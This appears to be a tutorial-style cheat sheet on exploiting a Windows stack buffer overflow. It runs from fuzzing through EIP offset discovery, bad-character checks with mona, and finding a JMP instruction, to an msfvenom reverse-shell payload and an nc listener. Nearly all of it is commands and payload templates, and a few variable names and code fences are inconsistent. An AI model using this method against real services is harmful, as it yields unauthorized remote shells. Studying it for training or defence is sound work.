## Buffer Overflow

### Finding the buffer overflow

Send large amounts of information to any available input parameters.  You're looking for the program to exit from an unhandled exception.

#### Sample Python fuzzing script
```
#!/usr/bin/python

# this is a very general python script that connects to a host/port and sends a payload.  It needs to be customized for the particular inputs to be tested in the applciation.

import sys, socket
HOST = <host or ip address>
PORT = <service port>
LENGTH = <length of buffer payload>

payload = "\x41" * LENGTH

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(payload)
s.recv(1024)
s.close()
```

#### Finding an offset value for EIP

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

# check the value stored in EIP and pass it to the pattern_offset tool

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <eip value> <length>
```

#### Verify EIP
```
# configure payload with the offset value
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
Payload = offset + EIP

# Run the script and check the EIP value.  If it indicates 'BBBB', we are able to write to EIP using the offset.

```

#### Finding where to place shellcode
```
# configure a test payload including the offset and EIP values 
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
shellcode = "\x43" * <length>
Payload = offset + EIP + shellcode

# run the script and check the stack.  if the 'C' values are present beyond the 'B' values, we have identified space for shellcode.  
# Identify whether an existing register is pointing to the shellcode space in the stack.
```

##### Generate bad characters

```
#! /usr/bin/python3
import sys
for x in range(1,256):
    sys.stdout.write("\\x" + '{:02x}'.format(x))
```
Execute the script and copy the output to paste into `ollydbg`  

##### Create a bytearray of badcharacters in ollydbg

```
# at the ollydbg command window

# create a bytearray of all available hexideciaml characters
!mona bytearray -b
```
##### Identify the memory location of the badcharacter array sent

```
# at the ollydbg command window

# using the memory address of the badcharacter array, pass it to mona and compare to our previously created bytearray
!mona compare -f bytearray.bin -a <memory address>
```
##### Verify the bad characters identified
```
# configure a test payload to exclude the known bad characters 
# using the python script above

offset = "\x41" * <offset value> 
EIP = "\x42\x42\x42\x42"
shellcode = "string of all hex characters excluding the identified bad characters"  
Payload = offset + EIP + badchars

#Execute the script  
```

##### Verify the remaining hex characters are valid

```
# at the ollydbg command window

# using the memory address of the badcharacter array, pass it to mona and compare to our previously created bytearray
!mona compare -f bytearray.bin -a <memory address>
```
##### Identify a JMP or CALL instruction to the shellcode memory address

```
# at the ollydbg command window

!mona jmp -r <memory address or register> -cpb "<bad characters>"
# return pointers are candidates for the EIP value

# to test the values, set a breakpoint at the JMP instruction address and then modify the python script with the memory address as the EIP value.  
# Remember the addresses are expressed in little endian, so they have to be entered in reverse.
# for example, a memory address of 565266B3 would be expressed as:
# EIP = "\xb3\x66\x52\x56" in the python script.
# if the breakpoint is reached after running the python script, proceed to the next step.
```

##### Generate shell code

```
# sample stageless reverse shell for windows
msfvenom -p windows/shell_reverse_tcp LHOST=<local ip> LPORT=<local listening port> EXITFUNC=thread -b "<badcharacters>" -f py

# add the output to the script.  It may also be necessary to add some NOPs prior to the shellcode in case the JMP instruction is not exact.

```
offset = "\x41" * <offset value> 
EIP = "<memory address for JMP to shellcode"
shellcode = "<shellcode output from msfvenom command"  
nops = "\x90" * 10 # experiment for number of nops as needed
Payload = offset + EIP + nops + shellcode
  
```
##### Start the remote listener and execute the script
```
nc -lvp <port>

# if it all works, you'll get a shell
```
